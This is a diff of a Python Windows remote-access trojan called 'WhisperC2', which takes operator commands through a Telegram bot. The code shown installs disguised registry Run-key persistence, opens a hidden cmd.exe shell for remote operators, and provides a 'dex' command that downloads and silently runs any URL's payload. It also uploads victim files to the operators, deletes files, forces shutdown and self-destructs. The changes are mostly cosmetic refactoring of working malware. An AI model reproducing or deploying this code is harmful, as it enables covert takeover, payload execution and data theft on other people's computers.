@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Production Ready (Reliable Shell + Multi-Agent)
+# WhisperC2 Professional – Production Ready (Reliable Shell)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -47,21 +47,31 @@ def generate_telemetry_report(status: str) -> str:
     with log_lock:
         for entry in log_lines[-30:]:
             rows += f"<tr><td>{entry['time']}</td><td>{entry['msg']}</td></tr>"
-    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{SYSTEM_ID}</title>
-<style>body{{background:#0d1117;color:#c9d1d9;font-family:Segoe UI}} .card{{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:20px;margin:20px auto;max-width:900px}}</style>
-</head><body><div class="card"><h1>{emoji} {SYSTEM_ID} - {status.upper()}</h1><table>{rows or '<tr><td>No logs</td></tr>'}</table></div></body></html>"""
+    html = f"""<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>{SYSTEM_ID}</title>
+<style>
+    body {{background:#0d1117;color:#c9d1d9;font-family:Segoe UI;}}
+    .card {{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:20px;margin:20px auto;max-width:900px;}}
+</style>
+</head><body>
+<div class="card">
+    <h1>{emoji} {SYSTEM_ID} - {status.upper()}</h1>
+    <table>{rows or '<tr><td>No logs yet</td></tr>'}</table>
+</div>
+</body></html>"""
     return html
 
 def send_telemetry(topic_id, status: str):
     if not topic_id: return
     try:
         bio = io.BytesIO(generate_telemetry_report(status).encode())
-        bio.name = f"{SYSTEM_ID}_{status}.html"
+        bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
         bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
     except:
         try:
-            bot.send_message(GROUP_CHAT_ID, f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}", 
-                           message_thread_id=topic_id)
+            bot.send_message(GROUP_CHAT_ID, 
+                             f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}", 
+                             message_thread_id=topic_id)
         except: pass
 
 # -----------------------------------------------------------------------------
@@ -83,7 +93,7 @@ HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
 TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
 
 # -----------------------------------------------------------------------------
-# Globals for Shell
+# Shell Globals
 # -----------------------------------------------------------------------------
 shell_active = False
 shell_process = None
@@ -91,7 +101,7 @@ _shell_topic_id = None
 shell_lock = threading.Lock()
 
 # -----------------------------------------------------------------------------
-# Persistence & Topic
+# Persistence & Topic Management
 # -----------------------------------------------------------------------------
 def get_or_create_topic():
     existing = None
@@ -113,7 +123,9 @@ def get_or_create_topic():
         return None
 
 def install_persistence():
-    if not getattr(sys, 'frozen', False): return False
+    if not getattr(sys, 'frozen', False): 
+        log("Persistence skipped – script mode")
+        return False
     try:
         dest = Path(agents_dir) / 'SystemSettingsBroker.exe'
         curr = Path(sys.executable)
@@ -121,8 +133,11 @@ def install_persistence():
             shutil.copy2(curr, dest)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
             winreg.SetValueEx(key, "System Settings Broker", 0, winreg.REG_SZ, str(dest))
+        log("Persistence installed")
+        return True
     except Exception as e:
         log(f"Persistence failed: {e}")
+        return False
 
 def self_destruct(topic_id):
     log("Self-destruct started")
@@ -137,7 +152,7 @@ def self_destruct(topic_id):
     except: pass
 
 # -----------------------------------------------------------------------------
-# Interactive Shell (Fixed & Reliable)
+# Interactive Shell
 # -----------------------------------------------------------------------------
 def spawn_shell(topic_id):
     global shell_active, shell_process, _shell_topic_id
@@ -145,12 +160,12 @@ def spawn_shell(topic_id):
         if shell_active: return True
         _shell_topic_id = topic_id
         try:
-            shell_process = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                             stderr=subprocess.STDOUT, text=True, bufsize=0,
-                                             creationflags=0x08000000)
+            shell_process = subprocess.Popen("cmd.exe", 
+                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=0, creationflags=0x08000000)
             shell_active = True
             threading.Thread(target=shell_reader, daemon=True).start()
-            log("Interactive shell started")
+            log("Interactive shell spawned")
             return True
         except Exception as e:
             log(f"Shell spawn failed: {e}")
@@ -220,22 +235,26 @@ def download_file_fs(path: str):
 def dex(arg_line: str):
     if not arg_line: return "Usage: dex <url> [args...]"
     parts = arg_line.split(maxsplit=1)
-    url, extra = parts[0], (parts[1].split() if len(parts)>1 else [])
+    url = parts[0]
+    extra = parts[1].split() if len(parts) > 1 else []
     p = urlparse(url)
     if p.scheme not in ('http','https'): return "Invalid scheme"
-    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + (os.path.splitext(p.path)[1] or ".exe")
-    dest = os.path.join(os.environ.get('TEMP','.'), name)
+    ext = os.path.splitext(p.path)[1] or ".exe"
+    name = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ext
+    dest = os.path.join(os.environ.get('TEMP', '.'), name)
     try:
         r = requests.get(url, stream=True, timeout=30)
         r.raise_for_status()
         with open(dest, 'wb') as f:
-            for chunk in r.iter_content(8192): f.write(chunk) if chunk else None
+            for chunk in r.iter_content(8192):
+                if chunk: f.write(chunk)
     except Exception as e: return f"Download failed: {e}"
     try:
         proc = subprocess.Popen([dest, *extra], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 text=True, creationflags=0x08000000)
         out, err = proc.communicate(timeout=30)
-        return f"Executed: {dest}\nExit: {proc.returncode}\n{(out+err).strip() or '[No output]'}"
+        output = (out + err).strip() or "[No output]"
+        return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
     except Exception as e: return f"Execution error: {e}"
     finally:
         try: ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
@@ -259,9 +278,12 @@ def execute_command(cmd_line: str, topic_id):
         return ps_cmd(args).replace('```',"'''"), None
     elif cmd in ("download", "downloadfile"):
         path, err = download_file_fs(args.strip())
-        return (err or f"⬆️ Uploading {args.strip()}", path)
+        if err: return err, None
+        return f"⬆️ Uploading {args.strip()}", path
     elif cmd == "delete":
-        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
+        try: 
+            os.remove(args.strip())
+            return f"🗑️ Deleted: {args.strip()}", None
         except Exception as e: return f"❌ Delete failed: {e}", None
     elif cmd in ("view", "viewfile"):
         return view_file(args.strip()).replace('```',"'''"), None
@@ -271,12 +293,12 @@ def execute_command(cmd_line: str, topic_id):
         self_destruct(topic_id)
         return "💀 Shutting down...", None
     elif cmd == "off":
-        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
+        subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=False)
         return "🔌 Shutting down PC...", None
     return f"❓ Unknown command: {cmd}", None
 
 # -----------------------------------------------------------------------------
-# Message Handler (Fixed Shell Logic)
+# Main Handler
 # -----------------------------------------------------------------------------
 def main():
     log("Agent starting")
@@ -307,12 +329,12 @@ def main():
         text = (message.text or "").strip()
         if not text: return
 
-        # === INTERACTIVE SHELL MODE ===
+        # Interactive Shell Mode
         if shell_active:
             clean = text[1:] if text.startswith('/') else text
             if clean.lower() == "exit":
                 kill_shell()
-                bot.reply_to(message, "💬 Shell closed.", message_thread_id=topic_id)
+                bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=topic_id)
             elif clean.lower().startswith("die"):
                 kill_shell()
                 execute_command("die", topic_id)
@@ -320,7 +342,7 @@ def main():
                 write_shell(clean)
             return
 
-        # === NORMAL COMMAND MODE ===
+        # Normal Command Mode
         if text.startswith('/'):
             text = text[1:].strip()
 
